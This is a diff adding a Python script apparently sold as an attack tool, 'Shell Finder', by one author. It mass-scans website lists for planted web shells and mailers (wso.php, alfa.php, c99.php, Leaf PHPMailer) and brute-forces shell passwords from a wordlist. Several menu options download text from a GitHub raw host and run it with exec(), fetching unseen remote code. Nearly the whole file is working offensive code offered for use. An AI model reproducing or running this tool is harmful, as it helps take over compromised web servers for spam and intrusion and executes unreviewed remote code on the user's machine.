@@ -1,0 +1,468 @@
+from __future__ import print_function
+import os
+import requests
+import threading
+from multiprocessing.dummy import Pool, Lock
+from bs4 import BeautifulSoup
+import time
+import urllib3
+import webbrowser
+import smtplib
+import colorama
+import sys
+from datetime import datetime
+import ctypes
+from random import choice
+from colorama import Fore
+from colorama import Style
+from colorama import init
+import re
+import platform
+import json
+import random
+import requests
+from getpass import getpass
+import datetime
+from tkinter import messagebox
+from multiprocessing.dummy import Pool as ThreadPool
+import socket,os,sys,threading,queue,time,random,ctypes,requests,webbrowser
+
+colorama.init()
+urllib3.disable_warnings()
+
+py_version = platform.python_version()
+if int(py_version[0]) == 2:
+   from Queue import Queue
+if int(py_version[0]) == 3:
+   from queue import Queue
+
+
+init(autoreset=True)
+fr = Fore.RED
+gr = Fore.BLUE
+fc = Fore.CYAN
+fw = Fore.WHITE
+fy = Fore.YELLOW
+fg = Fore.GREEN
+sd = Style.DIM
+sn = Style.NORMAL
+sb = Style.BRIGHT
+if sys.platform in ["linux","linux2"]:
+   purple = '\033[95m'
+   blue = '\033[94m'
+   cyan = '\033[96m'
+   green = '\033[92m'
+   yellow = '\033[93m'
+   red = '\033[91m'
+   end = '\033[0m'
+   bold = '\033[1m'
+   u = '\033[4m'
+else:
+   purple = ''
+   blue = ''
+   cyan = ''
+   green = ''
+   yellow = ''
+   red = ''
+   end = ''
+   bold = ''
+   u = ''
+CLEAR_SCREEN = "\033[2J"
+RED = "\033[31m"   # mode 31 = red forground
+RESET = "\033[0m"  # mode 0  = reset
+BLUE  = "\033[34m"
+YELLOW = "\033[1;33m"
+CYAN  = "\033[36m"
+GREEN = "\033[32m"
+RESET = "\033[0m"
+BOLD    = "\033[m"
+REVERSE = "\033[m"
+WHITE = "\033[1;37m"
+
+class Cl:
+	end	= '\033[0m'
+	red	= '\033[1;31m'
+	grn	= '\033[1;32m'
+	ylw	= '\033[1;33m'
+	wht	= '\033[1;37m'
+os.system('cls' if os.name == 'nt' else 'clear')
+
+def iprev1():
+    iprev1 = "https://raw.githubusercontent.com/MrxAmine/raw/main/IPREV1.txt"
+    r1 = requests.get(iprev1)
+    exec(r1.text)
+pass
+
+def updatee():
+    update = requests.get('https://raw.githubusercontent.com/MrxAmine/raw/main/work.txt')
+    print(fg+update.text)
+    time.sleep(2)
+pass
+def shellchk():
+    shell = "https://raw.githubusercontent.com/MrxAmine/raw/main/checkshell.txt"
+    rb = requests.get(shell)
+    exec(rb.text)
+pass
+def iptool():
+    iptool = "https://raw.githubusercontent.com/MrxAmine/raw/main/ipdomain.txt"
+    rh = requests.get(iptool)
+    exec(rh.text)
+pass
+def Folder(directory):
+  if not os.path.exists(directory):
+  	os.makedirs(directory)
+def updatemsg():
+    mssg = "https://raw.githubusercontent.com/MrxAmine/raw/main/update.txt"
+    rb = requests.get(mssg)
+    exec(rb.text)
+pass
+Folder("Bot-Result/[1] ShellFinder V1")
+
+Bad = 0
+Good = 0
+pro = 0
+mailer = 0
+password = 0
+
+
+def clear():
+	try:
+		if os.name == 'nt':
+			os.system('cls')
+		else:
+			os.system('clear')
+	except:
+		pass
+
+
+def finder(i):
+	global Bad, Good, pro, password, mailer
+	head = {
+	    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36'}
+	try:
+			x = requests.session()
+			for script in listaa :
+				url = ('http://'+i+'/'+script)
+				while True :
+					req_first = x.get(url, headers=head)
+					if ">public_html" in req_first.text:
+						Good = Good + 1
+						print(fg+"[+] Shell >> "+url)
+						with open("Bot-Result/[1] ShellFinder V1/Shell.txt", "a") as file:
+							file.write(url+"\n")
+							file.close()
+					elif "<span>Upload file:" in req_first.text:
+						Good = Good + 1
+						print("[/] generator >> "+url)
+						with open("Bot-Result/[1] ShellFinder V1/random.txt", "a") as gn:
+							gn.write(url+"\n")
+							gn.close()
+					elif 'type="submit" id="_upl" value="Upload">' in req_first.text:
+						Good = Good + 1
+						print("[+] Shell >> "+url)
+						with open("Bot-Result/[1] ShellFinder V1/Shell.txt", "a") as fox:
+							Good = Good + 1
+							fox.write(url+"\n")
+							fox.close()
+					elif 'Leaf PHPMailer' in req_first.text or '>alexusMailer 2.0<' in req_first.text:
+						mailer = mailer + 1
+						print('[§] Mailer >>  '+url)
+						with open('Bot-Result/[1] ShellFinder V1/Mailer.txt', 'a') as mailers:
+							mailers.write(url+'\n')
+							mailers.close()
+					elif 'method=post>Password:' in req_first.text or '<input type=password name=pass' in req_first.text:
+						password = password + 1
+						print(RESET+'[!]' 'Password : >> '+url)
+						with open('Bot-Result/[1] ShellFinder V1/WithPassword.txt', 'a') as pa:
+							pa.write(url+'\n')
+							pa.close()
+					elif 'name="uploader" id="uploader">' in req_first.text:
+						good = good + 1
+						print('{} [#] VULN PAGE : >>{}'.format(fy, url))
+						with open('Bot-Result/[1] ShellFinder V1/VULN.txt', 'a') as fo:
+							fo.write(url+'\n')
+							fo.close()
+					else:
+						Bad = Bad + 1
+						print(fc+"[ + ] "+fr+"Not found >>> "+i+"  >>>> "+script)
+						pass
+					break
+	except:
+		pass
+	if os.name == 'nt':
+		ctypes.windll.kernel32.SetConsoleTitleW(
+		    'Shell Finder v1  ꭍꭍ  Shell  :  {} ꭍꭍ Password : {} ꭍꭍ Mailer : {} ꭍꭍ BAD : {}   ꭍꭍ By AmineMrx '.format(Good,password , mailer, Bad))
+	else:
+		sys.stdout.write(
+		    '\x1b]2; Shell Finder v1  ꭍꭍ  Shell  :  {} ꭍꭍ Password : {} ꭍꭍ Mailer : {} ꭍꭍ BAD : {}   ꭍꭍ By AmineMrx '.format(Good,password , mailer, Bad))
+
+
+
+
+
+def run():
+	clear()
+	global listaa
+	print(fr+"""
+
+███████╗██╗  ██╗███████╗██╗     ██╗         ███████╗██╗███╗   ██╗██████╗ ███████╗██████╗ 
+██╔════╝██║  ██║██╔════╝██║     ██║         ██╔════╝██║████╗  ██║██╔══██╗██╔════╝██╔══██╗
+███████╗███████║█████╗  ██║     ██║         █████╗  ██║██╔██╗ ██║██║  ██║█████╗  ██████╔╝
+╚════██║██╔══██║██╔══╝  ██║     ██║         ██╔══╝  ██║██║╚██╗██║██║  ██║██╔══╝  ██╔══██╗
+███████║██║  ██║███████╗███████╗███████╗    ██║     ██║██║ ╚████║██████╔╝███████╗██║  ██║
+╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝    ╚═╝     ╚═╝╚═╝  ╚═══╝╚═════╝ ╚══════╝╚═╝  ╚═╝
+	                      \n \n""")
+	print(GREEN+" [ + ] V1 - Soon New Update")
+	print(GREEN+" [ + ] Tool By Amine Mrx")
+	print("")
+	print("")
+	file_name = input(BLUE+" [+] Websites List >> ")
+	op = open(file_name, 'r').read().splitlines()
+	TEXTList = [list.strip() for list in op]
+	listaa = ['x.php', 'alfa.php', 'c99.php', 'mini.php', 'a.php', 'wso.php', 'home.php', 'shell.php', 'leaf.php', 'wp-admin.php', 'leafmailer2.8.php', 'wso.php', 'a.php', 'leaf.php',
+'alex.php',
+'mailer.php',
+'anone.php',
+'a.php',
+'wp-configer.php',
+'alfa.php',
+'wso.php',
+'c.php',
+'1.php',
+'send.php',
+'3.php',
+'404.php',
+'sym.php',
+'wp-confirm.php',
+'images/vuln.php',
+'dr.php',
+'upload.php',
+'bypass.php',
+'wp-blog.php',
+'data.php',
+'owl.php',
+'vuln.php',
+'symlink.php',
+'ohayo.php',
+'100.php',
+'777.php',
+'wp-content/wp-logins.php',
+'1index.php',
+'wp-wso.php',
+'2index.php',
+'wp-content/wp-admin.php',
+'wp-configer.php',
+'wp-admin.php',
+'mini.php',
+'old-index.php',
+'doc.php',
+'ups.php',
+'shx.php',
+'FoxWSO.php',
+'x.php',
+'cms.php',
+'stindex.php',
+'wp-uploads.php',
+'autoload_classmap.php',
+'Gel.php',
+'defau1t.php',
+'0byte.php',
+'wp.php',
+'41.php',
+'media-admin.php',
+'4price.php',
+'MARIJUANA.php',
+'f.php',
+'.fk.php',
+'wikindex.php',
+'xox.php',
+'o.php',
+'new.php',
+'3index.php',
+'sindex.php',
+'baindex.php',
+'new-index.php',
+'wi.php',
+'XxX.php',
+'mar.php',
+'root.php',
+'11index.php',
+'wp-login.php',
+'nee.php',
+'v.php',
+'z.php',
+'xx.php',
+'g.php',
+'m.php',
+'shell.php',
+'sh3ll.php',
+'c99.php',
+'alexuse.php',
+'w.php',
+'ws.php',
+'2.php',
+'lol.php',
+'87.php',
+'7yn.php',
+'haxor.php',
+'403.php',
+'13.php',
+'cpanel.php','upload/fw' ] 
+	p = Pool(int(input(BLUE+' [+] Theard >> ')))
+	p.map(finder, TEXTList)
+
+
+def crack_password():
+	x = requests.session()
+	urll = input('Shell For Crack Password : ')
+	passw = open(input('Password List > : '), 'r',
+	             errors='ignore').read().splitlines()
+	for passs in passw:
+		data = {'pass': passs}
+		send = x.post(urll, data=data).text
+		if 'method=post>Password:' in send:
+			print('Password-false : '+passs)
+		else:
+			print('Password-True : '+passs)
+			with open('Bot-Result/[1] ShellFinder V1/PWD-TRUE.txt', 'a') as output:
+				output.write(passw+'\n')
+
+def valid():
+	print("Invalid Input")
+	quit()
+pass
+
+
+#####################################################&&"""&"&""
+def check_shell(url):
+	if url[:4] != "http":
+		url = "http://{}".format(url)
+	
+	try:	
+		req	= session.get(url, headers=head, verify=False, timeout=10)
+		res = req.url.lower().replace("%0d", "").replace("%0a", "")
+					
+		if req.status_code == 200 and res == url.replace("\r", ""):
+			s_200.write(url+"\n")
+			s_200.flush()
+			print("{}[{}{}{}][{}{}{}] {}{}{}".format(Cl.wht, Cl.grn, req.status_code, Cl.wht, Cl.grn, datetime.now().strftime('%H:%M:%S'), Cl.wht, Cl.grn, url, Cl.end))
+			
+		elif req.status_code == 403 and res == url.replace("\r", ""):
+			s_403.write(url+"\n")
+			s_403.flush()
+			print("{}[{}{}{}][{}{}{}] {}{}{}".format(Cl.wht, Cl.ylw, req.status_code, Cl.wht, Cl.ylw, datetime.now().strftime('%H:%M:%S'), Cl.wht, Cl.ylw, url, Cl.end))
+			
+		elif req.status_code >= 500 and res == url.replace("\r", ""):
+			s_500.write(url+"\n")
+			s_500.flush()
+			print("{}[{}{}{}][{}{}{}] {}{}{}".format(Cl.wht, Cl.red, req.status_code, Cl.wht, Cl.red, datetime.now().strftime('%H:%M:%S'), Cl.wht, Cl.red, url, Cl.end))
+		else:
+			pass
+	
+	except requests.exceptions.ConnectionError:
+		pass
+	except requests.exceptions.Timeout:
+		pass
+	except KeyboardInterrupt:
+		print("\n[!] Close Scanning...")
+		s_200.close()
+		s_403.close()
+		s_500.close()
+		exit(0)
+	except Exception as e:
+		print(fr+"[!] [Error] {}".format(e))
+
+def iplogin():
+    IP = requests.get('http://api.ipify.org/').text
+    r = requests.get('https://raw.githubusercontent.com/MrxAmine/raw/main/ipss.txt').text##Your raw link
+    if IP in r:
+        print(fg+'IP AUTHORIZED !')
+        pass
+    else:
+        os.system('cls')
+        print(Fore.RED + '\n -- ' + Fore.WHITE + Style.BRIGHT + 'IP address unauthorized!')
+        print(Style.RESET_ALL + Fore.RED + ' -- ' + Fore.WHITE + Style.BRIGHT + 'Your IP: ' + IP)
+        print()
+        print()
+        print()
+        print()
+        print("Press Enter To Quit ! ")
+        input()
+        quit()
+
+################################################################""
+logoo = """
+░█░░░█▀█░█▀▀░▀█▀░█▀█
+░█░░░█░█░█░█░░█░░█░█
+░▀▀▀░▀▀▀░▀▀▀░▀▀▀░▀░▀
+"""
+def Auth():
+    PASS = input(fg+" Your Key >> ")
+    r = requests.get('https://raw.githubusercontent.com/MrxAmine/raw/main/USER.txt').text
+    b = requests.get('https://raw.githubusercontent.com/MrxAmine/raw/main/PASS.txt').text
+    if PASS in b:
+        print(fg+"\n\nLogin Successful")
+        time.sleep(2.4)
+        clear()
+        pass
+    else:
+        os.system('cls')
+        print(Fore.RED + '\n -- ' + Fore.WHITE + Style.BRIGHT + 'KEY unauthorized!')
+        print(Style.RESET_ALL + Fore.RED + ' -- ' + Fore.WHITE + Style.BRIGHT + 'Key Used: ' + PASS)
+        print()
+        print()
+        print("Press Enter To Quit ! ")
+        input()
+        quit()
+print(fr+logoo)
+Auth()
+updatemsg()
+def main():
+	time.sleep(2.0)
+	iplogin()
+	print("")
+	input("Press ENTER to Continue")
+	time.sleep(2.0)
+	os.system('cls')
+	print(fr+"""
+ ███████████     ███████    ███████████    █████   █████ ████ 
+░░███░░░░░███  ███░░░░░███ ░█░░░███░░░█   ░░███   ░░███ ░░███ 
+ ░███    ░███ ███     ░░███░   ░███  ░     ░███    ░███  ░███ 
+ ░██████████ ░███      ░███    ░███        ░███    ░███  ░███ 
+ ░███░░░░░███░███      ░███    ░███        ░░███   ███   ░███ 
+ ░███    ░███░░███     ███     ░███         ░░░█████░    ░███ 
+ ███████████  ░░░███████░      █████          ░░███      █████
+░░░░░░░░░░░     ░░░░░░░       ░░░░░            ░░░      ░░░░░ 
+                                                              
+                                                              
+                                                              
+                                           """)
+
+	print("")
+	print(YELLOW+"Tool Menu :")
+	print("---------------------------------")
+	print(fg+'[1] Shell Finder V1 \n[2] Shell Checker \n[3] Reverse Ip Unlimited #1\n[4] Domain ↔ IP')
+	print("---------------------------------")
+	print("")
+	print(BLUE+"[9]  Server Discord")
+	print(BLUE+"[99] AmineMrx Telegram")
+	print("")
+	print(fr+"Tool By Amine Mrx [PAID]")
+	print("")
+	inp = int(input('Chose >> '))
+	if inp == 1 :
+		run()
+	elif inp == 2 :
+		shellchk()
+	elif inp == 3 :
+		iprev1()
+	elif inp == 4 :
+	     iptool()
+	elif inp == 9 :
+		webbrowser.open("https://discord.gg/JjvU6atXPN")
+	elif inp == 99 :
+		webbrowser.open("https://t.me/AmineMrx")
+	else:
+		exit()
+	
+main()
